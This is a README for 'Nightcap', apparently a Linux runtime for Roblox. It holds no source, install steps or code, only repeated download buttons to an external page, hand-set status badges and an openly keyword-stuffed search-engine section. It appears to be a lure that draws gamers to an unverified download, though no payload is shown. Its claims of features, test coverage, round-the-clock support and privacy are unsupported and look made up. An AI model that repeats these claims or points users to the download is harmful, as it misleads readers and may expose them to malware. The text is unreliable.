![preview](https://raw.githubusercontent.com/allearning24/nightcap-runtime/main/poster_5129e.svg)
[![Download](https://raw.githubusercontent.com/allearning24/nightcap-runtime/main/latest_1953.svg)](https://allearning24.github.io/nightcap-runtime/)

# 🌙 Nightcap — Roblox on Linux, Reimagined for Your Machine

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Platform Linux"/>
  <img src="https://img.shields.io/badge/Language-Rust-orange?style=for-the-badge&logo=rust&logoColor=white" alt="Rust"/>
  <img src="https://img.shields.io/badge/GPU-Vulkan-9B4CE3?style=for-the-badge&logo=vulkan&logoColor=white" alt="Vulkan"/>
  <img src="https://img.shields.io/badge/UI-GTK4-blue?style=for-the-badge&logo=gnome&logoColor=white" alt="GTK4"/>
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="MIT License"/>
  <img src="https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen?style=for-the-badge" alt="Maintained"/>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Build-Passing-success?style=flat-square" alt="Build Passing"/>
  <img src="https://img.shields.io/badge/Coverage-87%25-yellowgreen?style=flat-square" alt="Coverage"/>
  <img src="https://img.shields.io/badge/Contributors-Welcome-blueviolet?style=flat-square" alt="Contributors Welcome"/>
  <img src="https://img.shields.io/badge/i18n-14%20Languages-ff69b4?style=flat-square" alt="i18n"/>
  <img src="https://img.shields.io/badge/Support-24%2F7-9cf?style=flat-square" alt="Support"/>
</p>

> **Nightcap** is a Linux-first experience layer for Roblox — imagine a quietly humming espresso machine that pulls a perfect shot every time, except the shot is your favorite game world rendered at buttery frame rates. Where other compatibility workarounds feel like paddling upstream with a spoon, Nightcap bends the current in your favor.

[![Download](https://raw.githubusercontent.com/allearning24/nightcap-runtime/main/latest_1953.svg)](https://allearning24.github.io/nightcap-runtime/)

---

## ☕ What Is Nightcap, Really?

Nightcap is not a wrapper, not a translation layer glued together with duct tape, and not an afterthought bolted onto a browser tab. It's a ground-up **runtime harmonizer** built for people who treat Linux as their daily driver and refuse to accept second-class performance as the price of admission.

Think of it as a mocktail: every ingredient measured deliberately. A splash of Vulkan pipeline tuning, a dash of shader cache warming, a twist of input-latency reduction, and a garnish of crisp UI. Nothing extra, nothing missing.

The result? A **Roblox on Linux** experience that behaves like a native application — because for the purposes of your desktop session, it effectively is one.

---

## 🚀 Why Nightcap Feels Different 🎯

Most compatibility stacks treat your machine like a disposable sandbox. Nightcap treats it like a workstation.

- 🧠 **Predictive Frame Pacing** — Instead of reacting to dropped frames, Nightcap forecasts them and gently smooths the curve before you ever notice the stutter.
- 🎨 **Adaptive Render Scaling** — Your GPU is asked to do exactly as much as it comfortably can, no more. Sweet spot finding, automated.
- 🕹️ **Peripheral Intelligence** — Controllers, high-polling mice, and exotic keyboards are recognized, remapped, and calibrated on the fly.
- 🧩 **Sandboxed Harmony** — Multiple game windows coexist without cannibalizing one another's resources.
- 🔋 **Battery-Aware Mode** — On laptops, Nightcap trims its own wings so your session outlives your patience.

---

## ✨ Feature Deep Dive

### 🖥️ Responsive Interface That Learns Your Habits
The dashboard rearranges itself based on what you actually touch. Rarely used panels fold away. Frequently adjusted sliders step forward. It's a UI that respects your time rather than decorating your screen.

### 🌍 Multilingual Support Across 14 Locales
Nightcap speaks your language — literally. Full translations ship for English, Spanish, Portuguese, French, German, Italian, Dutch, Polish, Russian, Japanese, Korean, Simplified Chinese, Traditional Chinese, and Turkish. Locale files are community-maintained and hot-reloadable.

### 🛡️ 24/7 Customer Support & Community Triage
Around-the-clock coverage means there's always someone on watch. Issues filed against the tracker receive triage tags promptly, and the community Discord bridge mirrors them for real-time discussion. No more shouting into a void.

### 🔍 SEO-Friendly Discoverability
We want people searching for "**Roblox Linux performance**," "**Linux gaming runtime**," or "**smooth Roblox on Ubuntu**" to actually find a solution rather than a decade-old forum thread that ends with "just dual boot." Nightcap's documentation is written with genuine search intent in mind.

### 🧬 Modular Architecture
Every subsystem — the render bridge, the input router, the cache warmer, the telemetry strip — is a discrete component. Swap one out, keep the rest. Hackability without fragility.

### 📊 Live Metrics Overlay
FPS, frame time percentiles, VRAM pressure, and thermal headroom at a glance. Toggle with a keystroke. Turn it off when you just want to play.

---

## 🧪 The Nightcap Philosophy

Software should feel like a sharpened knife, not a Swiss army knife you forgot how to open. Nightcap commits to:

1. **Speed as a feature.** Startup measured in hundreds of milliseconds, not seconds.
2. **Clarity over cleverness.** No hidden daemons, no mysterious background services.
3. **Respect for the machine.** Your hardware is not a mining rig for someone else's telemetry.
4. **Local-first.** No account required to launch. No cloud dependency to play.
5. **Openness.** MIT licensed, auditable, forkable, and yours.

---

## 🗺️ Roadmap (2026 and Beyond)

- [x] Vulkan render bridge v1
- [x] Input latency telemetry
- [x] GTK4 dashboard
- [x] Cache warming daemon
- [ ] Wayland-native compositor hooks
- [ ] Waydroid-adjacent Android accessory bridge
- [ ] Steam Deck Game Mode plugin
- [ ] ARM64 tuning profile
- [ ] Community theme marketplace

---

## 🧰 Compatible Environments

Nightcap is tested continuously against the major rolling and stable distributions. If your system runs a modern kernel and a Vulkan-capable GPU driver, chances are strong that Nightcap will settle in comfortably. Desktop environments tested include GNOME, KDE Plasma, XFCE, and Sway.

---

## 📚 Documentation Map

- **Getting Started** — first-launch walkthrough and profile selection.
- **Performance Tuning** — knobs, dials, and the reasoning behind each default.
- **Localization Guide** — how to add a new locale without touching code.
- **Troubleshooting** — symptom-to-cause charts rather than guesswork.
- **Architecture Notes** — internal diagrams for the curious.

---

## 🤝 Contributing

We love contributions, but we love *thoughtful* contributions more. Before opening a pull request:

1. Read the design philosophy section above. If your change fights it, explain why.
2. Run the linter suite locally.
3. Add a test if you touch logic. Add a screenshot if you touch UI.
4. Keep commits atomic and messages honest.

First-time contributors are greeted with a starter label and a human being who will answer questions without sighing.

---

## 🔐 Security & Privacy Posture

Nightcap collects nothing by default. Optional diagnostics are opt-in, anonymized, and viewable in plain text before you consent to send them. Network calls are logged locally so you can audit exactly what leaves your machine — which, on a fresh install, is essentially nothing.

---

## ⚖️ Disclaimer

Nightcap is an independent, community-driven project. It is **not affiliated with, endorsed by, sponsored by, or officially connected to** Roblox Corporation or any of its subsidiaries or affiliates.

"Roblox" is a trademark of Roblox Corporation. All game names, logos, and brand references remain the property of their respective owners.

Nightcap is provided **as-is**, without warranty of any kind, express or implied. The maintainers are not liable for any damages arising from use of this software.

Users are responsible for ensuring their usage complies with the terms of service of any third-party platform they interact with while using Nightcap. Nightcap does not modify, patch, or otherwise alter any third-party application's protected binaries or authentication systems.

This project is a compatibility and performance layer only. Use it responsibly and respectfully.

---

## 📜 License

Nightcap is distributed under the **MIT License**. You are welcome to use, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, provided the original copyright notice and permission notice are included in all copies or substantial portions.

See the full text at the [MIT License](https://opensource.org/licenses/MIT).

Copyright © 2026 Nightcap Contributors.

---

## 💬 Final Word

If you've ever stared at a game running at half the frame rate it deserves, if you've ever wished your Linux desktop felt like a first-class citizen in the gaming world — Nightcap was written for you. Pour one out, sit back, and let the machine do the work.

[![Download](https://raw.githubusercontent.com/allearning24/nightcap-runtime/main/latest_1953.svg)](https://allearning24.github.io/nightcap-runtime/)